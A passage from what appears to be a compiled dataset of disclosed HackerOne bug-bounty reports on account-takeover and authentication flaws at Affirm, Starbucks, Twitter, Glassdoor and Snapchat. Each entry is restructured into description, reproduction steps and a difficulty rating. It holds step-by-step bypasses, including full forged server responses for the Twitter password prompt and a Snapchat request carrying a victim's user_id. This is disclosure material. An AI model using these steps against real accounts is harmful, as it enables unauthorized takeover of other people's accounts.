Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.
Impact
Unauthorized account access, Account takeover



================================================================================
Vulnerability Description:
The vulnerability allows unauthorized access to user accounts by brute-forcing the PIN due to the lack of token expiry. The login token generated does not expire, enabling repeated attempts to guess the PIN without limitation.

Steps to Reproduce:
1. Send a POST request to /api/v3/login/phone/ with a phone number to generate a login token.
2. Use the generated token to make a POST request to /api/v3/login/phone/SOMETOKEN with a brute-forced PIN until successful authentication.
Exploitation Difficulty:
The attack involves understanding the token generation and authentication flow, but the steps to exploit it are straightforward once the token is obtained. The lack of token expiry is a common security oversight, making the discovery less complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/767829: Account take over of 'light' starbuckscardb2b users
================================================================================
RAW DESCRIPTION:

This issue was found on https://www.starbuckscardb2b.com, this website belongs to starbucks and its is a critical vulnerability so I am reporting this.
Issue: An attacker can takeover the account of the victim by creating a new account by using victim's (who is already registered) email address.
Steps to reproduce are as follows:
Open https://www.starbuckscardb2b.com and go to create account.
for example user successfully created the account with abc@xyz.com and password 12345678
Now attacker will create the account with the email used in step 2 abc@xyz.com with different password.
After completion of step 3 the password for the abc@xyz.com user will be set to the password used by attacker.
This will result in the account take over by attacker.
Impact
An attacker can take over the control of any/all registered users.



================================================================================
Vulnerability Description:
An attacker can take over a victim's account by registering a new account with the victim's email address, which overwrites the victim's existing password.

Steps to Reproduce:
1. Open https://www.starbuckscardb2b.com and go to create account.
2. Create an account with a victim's email (e.g., abc@xyz.com) and a password (e.g., 12345678).
3. As an attacker, create another account using the same victim's email (abc@xyz.com) but with a different password.
4. Observe that the victim's password is overwritten by the attacker's password, resulting in account takeover.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple registration process with no complex interactions or state manipulations. The issue is a basic logic flaw in account creation that does not verify email uniqueness properly.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/770504: Bypass Password Authentication for updating email and phone number - Security Vulnerability
================================================================================
RAW DESCRIPTION:

Summary:
[Additional requirement for authentication is an extra layer of security for a person's Twitter account. Instead of only entering the password at the time of log in, twitter further Introduces additional layer of security by prompting users to enter their password before attempting to update any crucial Information such as email ID or phone numbers.
This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's personal details such as phone number or email id, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)
This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password) that is prompted to a user before trying to update the email ID and phone number under Settings and Privacy -> Accounts.]
Description:
[For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's e-mail ID and phone number by bypassing the password screen prompted during the verification process.
This will allow the hacker to reset the password either by requesting for a link and/or code on the email/mobile updated by them against the victim's account, therefore resulting in a complete account take over.
The security vulnerability is basically related to client side processing that is undertaken based on the response received from the server.
For example : Let's say the hacker enters the password and clicks on 'Next' there is a flow token that is generated by the client which is sent to the server. The server would then validate the password and return a response to the client to Indicate whether the next page must be loaded or If there was an error related to the request i.e. 'Wrong password'.
The security vulnerability allows for the client request and server response to be Intercepted and manipulated such that even though the hacker may have entered an Incorrect password, the server response can be Intercepted modified to a valid JSON response with the token flow number that was originally sent by the client to the server, therefore leading for twitter to believe that the authentication was successful and bypassing the password screen, thereby providing access to hackers to update the victims' email ID and phone number without the need for additional authentication.
]
Steps To Reproduce:
(Add details for how we can reproduce the issue)
With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.
Security Vulnerability #1 - Update Victim's E-mail ID - Bypass password screen
Go to Settings and Privacy -> Accounts
Click on Email -> Update email address
Enter any random password and Click on 'Next'
Intercept the request the above request
Copy the flow token up to :
Forward client request to server and Intercept the response from server to this request
Modify the Intercepted Server's Response with the below text please paste the flow token from step 5 below and remove the [square brackets]
Forward the modified 'Server Response' to the client
This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your email ID and verify It In order to add the email ID to the victim's account
-------------------------------------------COPY FROM BELOW START------------------------------------------------
HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 2732
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:12:15 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:12:15 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: 1d41600d4a1940ad3cab723b3ec0b57a
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 308
x-tsa-request-body-time: 1
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0
{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EmailAssocEnterEmail","enter_email":{"primary_text":{"text":"Change email","entities":[]},"secondary_text":{"text":"Your current email is ███. What would you like to update it to? Your email is not displayed in your public profile on Twitter.","entities":[]},"hint_text":"Email address","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"EmailAssocVerifyEmail"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your email address find and connect with you on Twitter. Learn more","entities":[{"from_index":77,"to_index":87,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"email_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}}}},{"subtask_id":"EmailAssocVerifyEmail","email_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify your email.\t","entities":[]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_email_verification_link","subtask_id":"DidNotReceiveEmailDialog"}}]},"hint_text":"Verification code","email":{"subtask_data_reference":{"key":"email","subtask_id":"EmailAssocEnterEmail"}},"name":{"subtask_data_reference":{"key":"name","subtask_id":"EmailAssocEnterEmail"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EmailAssocEnterEmail"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EmailAssocEnterEmail"},"verification_status_polling_enabled":false}},{"subtask_id":"DidNotReceiveEmailDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"email_link","label":"Resend","subtask_navigation_context":{"action":"resend_email"},"subtask_id":"EmailAssocVerifyEmail"}],"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_navigation_context":{"action":"cancel_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"}}}]}
-------------------------------------------COPY END------------------------------------------------

Security Vulnerability #2 - Update Victim's phone number - Bypass password screen
Go to Settings and Privacy -> Accounts
Click on Phone -> Add/Update phone number
Enter any random password and Click on 'Next'
Intercept the request the above request
Copy the flow token up to :
Forward client request to server and Intercept the response from server to this request
Modify the Intercepted Server's Response with the below text please paste the flow token from step 5 below and remove the [square brackets]
Forward the modified 'Server Response' to the client
This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your mobile number and verify It In order to add the phone number to the victim's account
-------------------------------------------COPY FROM BELOW START------------------------------------------------
HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 16612
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:36:13 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:36:13 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: be41fa15964cca748cd82c001728c777
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 305
x-tsa-request-body-time: 0
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0
{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EnterPhoneForAssociation","enter_phone":{"primary_text":{"text":"Add a phone number","entities":[]},"secondary_text":{"text":"Enter the phone number youâd like to associate with your Twitter account. Youâll get a verification code sent here.","entities":[]},"hint_text":"Your phone number","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"PhoneAssociationVerificationAlert"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your phone number find and connect with you on Twitter. Learn more","entities":[{"from_index":76,"to_index":86,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"phone_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}},"country_codes":[{"id":"AF","text":{"text":"+93 Afghanistan","entities":[]}},{"id":"AL","text":{"text":"+355 Albania","entities":[]}},{"id":"DZ","text":{"text":"+213 Algeria","entities":[]}},{"id":"AS","text":{"text":"+1 American Samoa","entities":[]}},{"id":"AD","text":{"text":"+376 Andorra","entities":[]}},{"id":"AO","text":{"text":"+244 Angola","entities":[]}},{"id":"AI","text":{"text":"+1 Anguilla","entities":[]}},{"id":"AG","text":{"text":"+1 Antigua and Barbuda","entities":[]}},{"id":"AR","text":{"text":"+54 Argentina","entities":[]}},{"id":"AM","text":{"text":"+374 Armenia","entities":[]}},{"id":"AW","text":{"text":"+297 Aruba","entities":[]}},{"id":"AU","text":{"text":"+61 Australia","entities":[]}},{"id":"AT","text":{"text":"+43 Austria","entities":[]}},{"id":"AZ","text":{"text":"+994 Azerbaijan","entities":[]}},{"id":"BS","text":{"text":"+1 Bahamas","entities":[]}},{"id":"BH","text":{"text":"+973 Bahrain","entities":[]}},{"id":"BD","text":{"text":"+880 Bangladesh","entities":[]}},{"id":"BB","text":{"text":"+1 Barbados","entities":[]}},{"id":"BY","text":{"text":"+375 Belarus","entities":[]}},{"id":"BE","text":{"text":"+32 Belgium","entities":[]}},{"id":"BZ","text":{"text":"+501 Belize","entities":[]}},{"id":"BJ","text":{"text":"+229 Benin","entities":[]}},{"id":"BM","text":{"text":"+1 Bermuda","entities":[]}},{"id":"BT","text":{"text":"+975 Bhutan","entities":[]}},{"id":"BO","text":{"text":"+591 Bolivia","entities":[]}},{"id":"BQ","text":{"text":"+599 Bonaire, Sint Eustatius and Saba","entities":[]}},{"id":"BA","text":{"text":"+387 Bosnia and Herzegovina","entities":[]}},{"id":"BW","text":{"text":"+267 Botswana","entities":[]}},{"id":"BR","text":{"text":"+55 Brazil","entities":[]}},{"id":"VG","text":{"text":"+1 British Virgin Islands","entities":[]}},{"id":"BN","text":{"text":"+673 Brunei","entities":[]}},{"id":"BG","text":{"text":"+359 Bulgaria","entities":[]}},{"id":"BF","text":{"text":"+226 Burkina Faso","entities":[]}},{"id":"BI","text":{"text":"+257 Burundi","entities":[]}},{"id":"KH","text":{"text":"+855 Cambodia","entities":[]}},{"id":"CM","text":{"text":"+237 Cameroon","entities":[]}},{"id":"CA","text":{"text":"+1 Canada","entities":[]}},{"id":"CV","text":{"text":"+238 Cape Verde","entities":[]}},{"id":"KY","text":{"text":"+1 Cayman Islands","entities":[]}},{"id":"CF","text":{"text":"+236 Central African Republic","entities":[]}},{"id":"TD","text":{"text":"+235 Chad","entities":[]}},{"id":"CL","text":{"text":"+56 Chile","entities":[]}},{"id":"CN","text":{"text":"+86 China","entities":[]}},{"id":"CO","text":{"text":"+57 Colombia","entities":[]}},{"id":"KM","text":{"text":"+269 Comoros","entities":[]}},{"id":"CG","text":{"text":"+242 Congo","entities":[]}},{"id":"CK","text":{"text":"+682 Cook Islands","entities":[]}},{"id":"CR","text":{"text":"+506 Costa Rica","entities":[]}},{"id":"HR","text":{"text":"+385 Croatia","entities":[]}},{"id":"CU","text":{"text":"+53 Cuba","entities":[]}},{"id":"CW","text":{"text":"+599 CuraÃ§ao","entities":[]}},{"id":"CY","text":{"text":"+357 Cyprus","entities":[]}},{"id":"CZ","text":{"text":"+420 Czech Republic","entities":[]}},{"id":"CI","text":{"text":"+225 CÃ´te d'Ivoire","entities":[]}},{"id":"DK","text":{"text":"+45 Denmark","entities":[]}},{"id":"DJ","text":{"text":"+253 Djibouti","entities":[]}},{"id":"DM","text":{"text":"+1 Dominica","entities":[]}},{"id":"DO","text":{"text":"+1 Dominican Republic","entities":[]}},{"id":"EC","text":{"text":"+593 Ecuador","entities":[]}},{"id":"EG","text":{"text":"+20 Egypt","entities":[]}},{"id":"SV","text":{"text":"+503 El Salvador","entities":[]}},{"id":"GQ","text":{"text":"+240 Equatorial Guinea","entities":[]}},{"id":"ER","text":{"text":"+291 Eritrea","entities":[]}},{"id":"EE","text":{"text":"+372 Estonia","entities":[]}},{"id":"ET","text":{"text":"+251 Ethiopia","entities":[]}},{"id":"FK","text":{"text":"+500 Falkland Islands","entities":[]}},{"id":"FO","text":{"text":"+298 Faroe Islands","entities":[]}},{"id":"FJ","text":{"text":"+679 Fiji","entities":[]}},{"id":"FI","text":{"text":"+358 Finland","entities":[]}},{"id":"FR","text":{"text":"+33 France","entities":[]}},{"id":"GF","text":{"text":"+594 French Guiana","entities":[]}},{"id":"PF","text":{"text":"+689 French Polynesia","entities":[]}},{"id":"GA","text":{"text":"+241 Gabon","entities":[]}},{"id":"GM","text":{"text":"+220 Gambia","entities":[]}},{"id":"GE","text":{"text":"+995 Georgia","entities":[]}},{"id":"DE","text":{"text":"+49 Germany","entities":[]}},{"id":"GH","text":{"text":"+233 Ghana","entities":[]}},{"id":"GI","text":{"text":"+350 Gibraltar","entities":[]}},{"id":"GR","text":{"text":"+30 Greece","entities":[]}},{"id":"GL","text":{"text":"+299 Greenland","entities":[]}},{"id":"GD","text":{"text":"+1 Grenada","entities":[]}},{"id":"GP","text":{"text":"+590 Guadeloupe","entities":[]}},{"id":"GU","text":{"text":"+1 Guam","entities":[]}},{"id":"GT","text":{"text":"+502 Guatemala","entities":[]}},{"id":"GN","text":{"text":"+224 Guinea","entities":[]}},{"id":"GW","text":{"text":"+245 Guinea-Bissau","entities":[]}},{"id":"GY","text":{"text":"+592 Guyana","entities":[]}},{"id":"HT","text":{"text":"+509 Haiti","entities":[]}},{"id":"HN","text":{"text":"+504 Honduras","entities":[]}},{"id":"HK","text":{"text":"+852 Hong Kong","entities":[]}},{"id":"HU","text":{"text":"+36 Hungary","entities":[]}},{"id":"IS","text":{"text":"+354 Iceland","entities":[]}},{"id":"IN","text":{"text":"+91 India","entities":[]}},{"id":"ID","text":{"text":"+62 Indonesia","entities":[]}},{"id":"IR","text":{"text":"+98 Iran","entities":[]}},{"id":"IQ","text":{"text":"+964 Iraq","entities":[]}},{"id":"IE","text":{"text":"+353 Ireland","entities":[]}},{"id":"IM","text":{"text":"+44 Isle Of Man","entities":[]}},{"id":"IL","text":{"text":"+972 Israel","entities":[]}},{"id":"IT","text":{"text":"+39 Italy","entities":[]}},{"id":"JM","text":{"text":"+1 Jamaica","entities":[]}},{"id":"JP","text":{"text":"+81 Japan","entities":[]}},{"id":"JE","text":{"text":"+44 Jersey","entities":[]}},{"id":"JO","text":{"text":"+962 Jordan","entities":[]}},{"id":"KZ","text":{"text":"+7 Kazakhstan","entities":[]}},{"id":"KE","text":{"text":"+254 Kenya","entities":[]}},{"id":"KI","text":{"text":"+686 Kiribati","entities":[]}},{"id":"KW","text":{"text":"+965 Kuwait","entities":[]}},{"id":"KG","text":{"text":"+996 Kyrgyzstan","entities":[]}},{"id":"LA","text":{"text":"+856 Laos","entities":[]}},{"id":"LV","text":{"text":"+371 Latvia","entities":[]}},{"id":"LB","text":{"text":"+961 Lebanon","entities":[]}},{"id":"LS","text":{"text":"+266 Lesotho","entities":[]}},{"id":"LR","text":{"text":"+231 Liberia","entities":[]}},{"id":"LY","text":{"text":"+218 Libya","entities":[]}},{"id":"LI","text":{"text":"+423 Liechtenstein","entities":[]}},{"id":"LT","text":{"text":"+370 Lithuania","entities":[]}},{"id":"LU","text":{"text":"+352 Luxembourg","entities":[]}},{"id":"MO","text":{"text":"+853 Macao","entities":[]}},{"id":"MK","text":{"text":"+389 Macedonia","entities":[]}},{"id":"MG","text":{"text":"+261 Madagascar","entities":[]}},{"id":"MW","text":{"text":"+265 Malawi","entities":[]}},{"id":"MY","text":{"text":"+60 Malaysia","entities":[]}},{"id":"MV","text":{"text":"+960 Maldives","entities":[]}},{"id":"ML","text":{"text":"+223 Mali","entities":[]}},{"id":"MT","text":{"text":"+356 Malta","entities":[]}},{"id":"MQ","text":{"text":"+596 Martinique","entities":[]}},{"id":"MR","text":{"text":"+222 Mauritania","entities":[]}},{"id":"MU","text":{"text":"+230 Mauritius","entities":[]}},{"id":"YT","text":{"text":"+262 Mayotte","entities":[]}},{"id":"MX","text":{"text":"+52 Mexico","entities":[]}},{"id":"FM","text":{"text":"+691 Micronesia","entities":[]}},{"id":"MD","text":{"text":"+373 Moldova","entities":[]}},{"id":"MC","text":{"text":"+377 Monaco","entities":[]}},{"id":"MN","text":{"text":"+976 Mongolia","entities":[]}},{"id":"ME","text":{"text":"+382 Montenegro","entities":[]}},{"id":"MS","text":{"text":"+1 Montserrat","entities":[]}},{"id":"MA","text":{"text":"+212 Morocco","entities":[]}},{"id":"MZ","text":{"text":"+258 Mozambique","entities":[]}},{"id":"MM","text":{"text":"+95 Myanmar","entities":[]}},{"id":"NA","text":{"text":"+264 Namibia","entities":[]}},{"id":"NR","text":{"text":"+674 Nauru","entities":[]}},{"id":"NP","text":{"text":"+977 Nepal","entities":[]}},{"id":"NL","text":{"text":"+31 Netherlands","entities":[]}},{"id":"NC","text":{"text":"+687 New Caledonia","entities":[]}},{"id":"NZ","text":{"text":"+64 New Zealand","entities":[]}},{"id":"NI","text":{"text":"+505 Nicaragua","entities":[]}},{"id":"NE","text":{"text":"+227 Niger","entities":[]}},{"id":"NG","text":{"text":"+234 Nigeria","entities":[]}},{"id":"NF","text":{"text":"+672 Norfolk Island","entities":[]}},{"id":"MP","text":{"text":"+1 Northern Mariana Islands","entities":[]}},{"id":"NO","text":{"text":"+47 Norway","entities":[]}},{"id":"OM","text":{"text":"+968 Oman","entities":[]}},{"id":"PK","text":{"text":"+92 Pakistan","entities":[]}},{"id":"PS","text":{"text":"+970 Palestine","entities":[]}},{"id":"PA","text":{"text":"+507 Panama","entities":[]}},{"id":"PG","text":{"text":"+675 Papua New Guinea","entities":[]}},{"id":"PY","text":{"text":"+595 Paraguay","entities":[]}},{"id":"PE","text":{"text":"+51 Peru","entities":[]}},{"id":"PH","text":{"text":"+63 Philippines","entities":[]}},{"id":"PL","text":{"text":"+48 Poland","entities":[]}},{"id":"PT","text":{"text":"+351 Portugal","entities":[]}},{"id":"PR","text":{"text":"+1 Puerto Rico","entities":[]}},{"id":"QA","text":{"text":"+974 Qatar","entities":[]}},{"id":"RE","text":{"text":"+262 Reunion","entities":[]}},{"id":"RO","text":{"text":"+40 Romania","entities":[]}},{"id":"RU","text":{"text":"+7 Russia","entities":[]}},{"id":"RW","text":{"text":"+250 Rwanda","entities":[]}},{"id":"KN","text":{"text":"+1 Saint Kitts And Nevis","entities":[]}},{"id":"LC","text":{"text":"+1 Saint Lucia","entities":[]}},{"id":"MF","text":{"text":"+590 Saint Martin","entities":[]}},{"id":"VC","text":{"text":"+1 Saint Vincent And The Grenadines","entities":[]}},{"id":"WS","text":{"text":"+685 Samoa","entities":[]}},{"id":"SM","text":{"text":"+378 San Marino","entities":[]}},{"id":"ST","text":{"text":"+239 Sao Tome And Principe","entities":[]}},{"id":"SA","text":{"text":"+966 Saudi Arabia","entities":[]}},{"id":"SN","text":{"text":"+221 Senegal","entities":[]}},{"id":"RS","text":{"text":"+381 Serbia","entities":[]}},{"id":"SC","text":{"text":"+248 Seychelles","entities":[]}},{"id":"SL","text":{"text":"+232 Sierra Leone","entities":[]}},{"id":"SG","text":{"text":"+65 Singapore","entities":[]}},{"id":"SX","text":{"text":"+1 Sint Maarten (Dutch part)","entities":[]}},{"id":"SK","text":{"text":"+421 Slovakia","entities":[]}},{"id":"SI","text":{"text":"+386 Slovenia","entities":[]}},{"id":"SB","text":{"text":"+677 Solomon Islands","entities":[]}},{"id":"SO","text":{"text":"+252 Somalia","entities":[]}},{"id":"ZA","text":{"text":"+27 South Africa","entities":[]}},{"id":"KR","text":{"text":"+82 South Korea","entities":[]}},{"id":"SS","text":{"text":"+211 South Sudan","entities":[]}},{"id":"ES","text":{"text":"+34 Spain","entities":[]}},{"id":"LK","text":{"text":"+94 Sri Lanka","entities":[]}},{"id":"SR","text":{"text":"+597 Suriname","entities":[]}},{"id":"SZ","text":{"text":"+268 Swaziland","entities":[]}},{"id":"SE","text":{"text":"+46 Sweden","entities":[]}},{"id":"CH","text":{"text":"+41 Switzerland","entities":[]}},{"id":"TW","text":{"text":"+886 Taiwan","entities":[]}},{"id":"TJ","text":{"text":"+992 Tajikistan","entities":[]}},{"id":"TZ","text":{"text":"+255 Tanzania","entities":[]}},{"id":"TH","text":{"text":"+66 Thailand","entities":[]}},{"id":"CD","text":{"text":"+243 The Democratic Republic Of Congo","entities":[]}},{"id":"TL","text":{"text":"+670 Timor-Leste","entities":[]}},{"id":"TG","text":{"text":"+228 Togo","entities":[]}},{"id":"TO","text":{"text":"+676 Tonga","entities":[]}},{"id":"TT","text":{"text":"+1 Trinidad and Tobago","entities":[]}},{"id":"TN","text":{"text":"+216 Tunisia","entities":[]}},{"id":"TR","text":{"text":"+90 Turkey","entities":[]}},{"id":"TM","text":{"text":"+993 Turkmenistan","entities":[]}},{"id":"TC","text":{"text":"+1 Turks And Caicos Islands","entities":[]}},{"id":"TV","text":{"text":"+688 Tuvalu","entities":[]}},{"id":"VI","text":{"text":"+1 U.S. Virgin Islands","entities":[]}},{"id":"UG","text":{"text":"+256 Uganda","entities":[]}},{"id":"UA","text":{"text":"+380 Ukraine","entities":[]}},{"id":"AE","text":{"text":"+971 United Arab Emirates","entities":[]}},{"id":"GB","text":{"text":"+44 United Kingdom","entities":[]}},{"id":"US","text":{"text":"+1 United States","entities":[]}},{"id":"UY","text":{"text":"+598 Uruguay","entities":[]}},{"id":"UZ","text":{"text":"+998 Uzbekistan","entities":[]}},{"id":"VU","text":{"text":"+678 Vanuatu","entities":[]}},{"id":"VE","text":{"text":"+58 Venezuela","entities":[]}},{"id":"VN","text":{"text":"+84 Vietnam","entities":[]}},{"id":"XK","text":{"text":"+383 XK","entities":[]}},{"id":"YE","text":{"text":"+967 Yemen","entities":[]}},{"id":"ZM","text":{"text":"+260 Zambia","entities":[]}},{"id":"ZW","text":{"text":"+263 Zimbabwe","entities":[]}}],"default_country_code":"IN"}},{"subtask_id":"PhoneAssociationVerificationAlert","alert_dialog":{"next_link":{"link_type":"subtask","link_id":"next_link","label":"OK","subtask_id":"PhoneAssociationVerification"},"primary_text":{"text":"Verify phone","entities":[]},"secondary_text":{"text":"We'll send your verification code to . Standard SMS, call and data fees may apply.","entities":[{"from_index":37,"to_index":37,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Edit","subtask_id":"EnterPhoneForAssociation"}}},{"subtask_id":"PhoneAssociationVerification","phone_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify .","entities":[{"from_index":25,"to_index":25,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_phone_verification_link","subtask_id":"DidNotReceiveSMSDialog"}}]},"hint_text":"Verification code","phone_number":{"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EnterPhoneForAssociation"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EnterPhoneForAssociation"},"auto_verify_hint_text":"Waiting for SMS to arrive...","send_via_voice":false,"phone_country_code":{"subtask_data_reference":{"key":"country_code","subtask_id":"EnterPhoneForAssociation"}}}},{"subtask_id":"DidNotReceiveSMSDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"sms_link","label":"Resend","subtask_navigation_context":{"action":"resend_sms"},"subtask_id":"PhoneAssociationVerification"}],"cancel_link":{"link_type":"task","link_id":"skip_link","label":"Cancel"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_phone_dialog"},"subtask_id":"PhoneAssociationVerification"}}}]}
-------------------------------------------COPY END------------------------------------------------
Impact:
[This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password screen which would enable them to update the email ID and the phone number against the victim's account thereby providing the hacker with complete authority/access over the victim's account]
Supporting Material/References:
[Please see attached the video for demonstration and steps to reproduce this security vulnerability]
Impact
An attacker could potentially capitalize on the 'hijacked' session and completely take over the victim's twitter account by modifying the email id and mobile phone number of the user without having to authenticate themselves with the correct password. As a result, It would defeat Twitter's additional layer of security i.e. password prompt and would lead to the user being locked out from ever accessing their twitter account again.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker with a hijacked session to bypass the password authentication required to update sensitive account information (email and phone number) by intercepting and modifying the server response. The attacker can then take complete control of the victim's account by changing these details and resetting the password.

Steps to Reproduce:
1. Go to Settings and Privacy -> Accounts
2. Click on Email -> Update email address or Phone -> Add/Update phone number
3. Enter any random password and Click on 'Next'
4. Intercept the request using a proxy tool (e.g., Burp Suite)
5. Copy the flow token from the intercepted request
6. Forward the client request to the server and intercept the response
7. Modify the intercepted server response with a valid JSON response containing the copied flow token
8. Forward the modified server response to the client
9. Bypass the password screen and proceed to update the email or phone number
Exploitation Difficulty:
The vulnerability involves multiple components including session hijacking, request interception, and response manipulation. The attacker needs to understand the flow token mechanism and how to craft a valid server response. The interaction between these components is subtle and requires precise manipulation of the application state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/897385: 2FA bypass by sending blank code
================================================================================
RAW DESCRIPTION:

Summary: █████████. This is a failure in null check of the entered code. In simple terms, the 2FA while logging in can be bypassed by sending a blank code. This could be because of incorrect comparison of entered code with true code. A pre-validation (may be null check) before comparing the codes would fix the issue
Affected URL or select Asset from In-Scope: Glassdoor 2FA
Affected Parameter: code
Vulnerability Type: Improper Authentication
Browsers tested: Browser independent
Steps To Reproduce:
(Add details for how we can reproduce the issue)
Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_input.htm
Enable 2FA
Logout
Login again and notice OTP is asked
Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
Before forwarding the request to server, remove the code and forward
Turnoff Intercept and notice that your login request has been fulfilled
Supporting Material/References (screenshots, logs, videos):
███████
Impact
2FA Protection bypass. Attacker could gain access despite the 2FA protection by victim



================================================================================
Vulnerability Description:
This is a failure in null check of the entered code. In simple terms, the 2FA while logging in can be bypassed by sending a blank code. This could be because of incorrect comparison of entered code with true code. A pre-validation (may be null check) before comparing the codes would fix the issue.

Steps to Reproduce:
1. Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_input.htm
2. Enable 2FA
3. Logout
4. Login again and notice OTP is asked
5. Using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
6. Before forwarding the request to server, remove the code and forward
7. Turnoff Intercept and notice that your login request has been fulfilled
Exploitation Difficulty:
The vulnerability involves a straightforward bypass of 2FA by sending a blank code, which is a simple and well-known type of vulnerability (missing null check). The attack does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/921780: Improper Authentication - any user can login as other user with otp/logout & otp/login
================================================================================
RAW DESCRIPTION:

'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.
I will demonstrate the problem on two accounts.
Victim: ███
Attacker: ██████████
Attacker perform a usuall login to attacker's personal account.
Attacker performs /scauth/otp/droid/logout but instead of attacker's user_id, attacker provides victim's user_id request
Code 482 Bytes
1POST /scauth/otp/droid/logout HTTP/1.1
2Host: gcp.api.snapchat.com
3Connection: close
4Content-Length: 168
5X-Snapchat-Client-Auth: ██████
6X-Snapchat-UUID: ███
7x-snapchat-userid: █████
8username: ███
9req_token: █████████
10timestamp: 1594604280000
11Accept: application/json
12User-Agent: Snapchat/10.78.1.0 █████
13Accept-Language: en-GB;q=1, en;q=0.9
14Content-Type: application/json; charset=utf-8
15Accept-Encoding: gzip, deflate
16
17{"user_id":"████","device_id":"███████","device_name":"███████"}
response
Code 696 Bytes
1HTTP/1.1 200 OK
2date: Mon, 13 Jul 2020 01:39:18 GMT
